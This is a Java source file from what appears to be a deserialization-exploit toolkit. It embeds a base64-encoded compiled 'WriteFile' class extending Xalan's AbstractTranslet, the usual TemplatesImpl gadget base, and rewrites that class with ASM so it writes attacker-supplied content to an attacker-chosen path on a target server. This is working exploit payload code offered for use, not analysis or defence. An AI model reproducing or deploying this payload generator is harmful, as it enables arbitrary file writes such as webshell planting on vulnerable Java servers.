package com.aurora.Templates;

import com.aurora.SupportType.MyDIYType;
import com.aurora.Utils.*;
import org.objectweb.asm.ClassReader;
import org.objectweb.asm.ClassWriter;

import java.io.FileOutputStream;
import java.io.IOException;

import static org.objectweb.asm.Opcodes.ASM6;

public class PutfileTemplate implements Template{
    private String className;
    private byte[] bytes;
    private String Path;
    private String Content;
    public PutfileTemplate(String Path,String Content){
        this.Path = new String(Utils.Base64DecodeStr2bytes(Path));
        this.className = "WriteFile";
        this.Content = Content;
        generate();
    }
    public void cache(){
        Cache.set(className, bytes);
    }
    public String getClassName(){
        return className;
    }
    public byte[] getBytes(){
        return bytes;
    }
    public void generate() {
        String WriteFileClassBase64 = "yv66vgAAADIAeAoAIAA4CQAfADkKAB8AOgcAOwkAHwA8CgAEAD0KAAQAPgcAPwoACABACABBCgAMAEIHAEMKAAwARAoARQBGBwBHCgBFAEgKAA8ASQgASgcASwoADABMCgBNAEYKAE4ATwoATQBQBwBRCABSCQBTAFQKAFMAVQgAVgoADABXCgAYAEAHAFgHAFkBAARQYXRoAQASTGphdmEvbGFuZy9TdHJpbmc7AQANQ29udGVudGJhc2U2NAEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAA1TdGFja01hcFRhYmxlBwBYBwA/AQAVQmFzZTY0RGVjb2RlU3RyMmJ5dGVzAQAWKExqYXZhL2xhbmcvU3RyaW5nOylbQgcAWgcAQwcAUQcAUQEACXRyYW5zZm9ybQEApihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAApFeGNlcHRpb25zBwBbAQByKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO1tMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAKU291cmNlRmlsZQEADldyaXRlRmlsZS5qYXZhDAAkACUMACMAIgwAKwAsAQAYamF2YS9pby9GaWxlT3V0cHV0U3RyZWFtDAAhACIMACQAXAwAXQBeAQATamF2YS9pby9JT0V4Y2VwdGlvbgwAXwAlAQAgamF2YXgueG1sLmJpbmQuRGF0YXR5cGVDb252ZXJ0ZXIMAGAAYQEAD2phdmEvbGFuZy9DbGFzcwwAYgBjBwBkDABlAGYBABBqYXZhL2xhbmcvT2JqZWN0DABnAGgMAGkAagEAEXBhcnNlQmFzZTY0QmluYXJ5AQACW0IMAGsAbAcAbQcAWgwAbgBvDABwAHEBABNqYXZhL2xhbmcvRXhjZXB0aW9uAQAYamF2YS51dGlsLkJhc2U2NCREZWNvZGVyBwByDABzAHQMAHUAdgEABmRlY29kZQwAdwBsAQAJV3JpdGVGaWxlAQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAEAEGphdmEvbGFuZy9TdHJpbmcBADljb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvVHJhbnNsZXRFeGNlcHRpb24BABUoTGphdmEvbGFuZy9TdHJpbmc7KVYBAAV3cml0ZQEABShbQilWAQAPcHJpbnRTdGFja1RyYWNlAQAHZm9yTmFtZQEAJShMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9DbGFzczsBABZnZXREZWNsYXJlZENvbnN0cnVjdG9yAQAzKFtMamF2YS9sYW5nL0NsYXNzOylMamF2YS9sYW5nL3JlZmxlY3QvQ29uc3RydWN0b3I7AQAdamF2YS9sYW5nL3JlZmxlY3QvQ29uc3RydWN0b3IBAA1zZXRBY2Nlc3NpYmxlAQAEKFopVgEAC25ld0luc3RhbmNlAQAnKFtMamF2YS9sYW5nL09iamVjdDspTGphdmEvbGFuZy9PYmplY3Q7AQAIZ2V0Q2xhc3MBABMoKUxqYXZhL2xhbmcvQ2xhc3M7AQARZ2V0RGVjbGFyZWRNZXRob2QBAEAoTGphdmEvbGFuZy9TdHJpbmc7W0xqYXZhL2xhbmcvQ2xhc3M7KUxqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2Q7AQAYamF2YS9sYW5nL3JlZmxlY3QvTWV0aG9kAQAIZ2V0Qnl0ZXMBAAQoKVtCAQAGaW52b2tlAQA5KExqYXZhL2xhbmcvT2JqZWN0O1tMamF2YS9sYW5nL09iamVjdDspTGphdmEvbGFuZy9PYmplY3Q7AQARamF2YS9sYW5nL0Jvb2xlYW4BAARUWVBFAQARTGphdmEvbGFuZy9DbGFzczsBAAd2YWx1ZU9mAQAWKFopTGphdmEvbGFuZy9Cb29sZWFuOwEACWdldE1ldGhvZAAhAB8AIAAAAAIACgAhACIAAAAKACMAIgAAAAQAAQAkACUAAQAmAAAAegADAAMAAAAlKrcAASqyAAK2AANMuwAEWbIABbcABk0sK7YAB6cACE0stgAJsQABAAwAHAAfAAgAAgAnAAAAIgAIAAAADQAEAA4ADAAQABcAEQAcABQAHwASACAAEwAkABUAKAAAABMAAv8AHwACBwApBwATAAEHACoEAAEAKwAsAAEAJgAAAZAABgAIAAAA2gFNAU4SCrgAC04tA70ADLYADToEGQQEtgAOGQQDvQAPtgAQOgUZBbYAERISBL0ADFkDEwATU7YAFDoGGQYEtgAVGQYZBQS9AA9ZAyu2ABZTtgAXwAATwAATTSywOgQSGbgAC04tBb0ADFkDsgAaU1kEsgAaU7YADToFGQUEtgAOGQUFvQAPWQMDuAAbU1kEA7gAG1O2ABA6BhkGtgAREhwEvQAMWQMTABNTtgAdOgcZBwS2ABUZBxkGBL0AD1kDK7YAFlO2ABfAABPAABNNpwAKOgUZBbYAHiywAAIABABbAFwAGABeAM4A0QAYAAIAJwAAAFoAFgAAABcAAgAYAAQAGgAKABsAFAAcABoAHQAlAB4AOwAfAEEAIABaACEAXAAiAF4AJABkACUAegAmAIAAJwCZACgArwApALUAKgDOAC0A0QArANMALADYADAAKAAAADQAA/8AXAAEBwApBwAtBwATBwAuAAEHAC//AHQABQcAKQcALQcAEwcALgcAMAABBwAv+gAGAAEAMQAyAAIAJgAAABkAAAAEAAAAAbEAAAABACcAAAAGAAEAAAAzADMAAAAEAAEANAABADEANQACACYAAAAZAAAAAwAAAAGxAAAAAQAnAAAABgABAAAANQAzAAAABAABADQAAQA2AAAAAgA3";
        ClassReader cr = null;
        cr = new ClassReader(Utils.Base64DecodeStr2bytes(WriteFileClassBase64));
        ClassWriter cw = new ClassWriter(cr, ClassWriter.COMPUTE_MAXS);
        ASMChanger.ModifyAccessVisitor mv = new ASMChanger.ModifyAccessVisitor(ASM6,cw,MyDIYType.PutFile,"",Path,Content);
        cr.accept(mv,ClassReader.SKIP_FRAMES);
        bytes = cw.toByteArray();

    }
    public static void fileOutputStreamMethod(String filepath, byte[] content) throws IOException {
        try  {
            FileOutputStream fileOutputStream = new FileOutputStream(filepath);
            byte[] bytes = content;
            fileOutputStream.write(bytes);
        }catch (Exception e){
            e.printStackTrace();
        }
    }
}
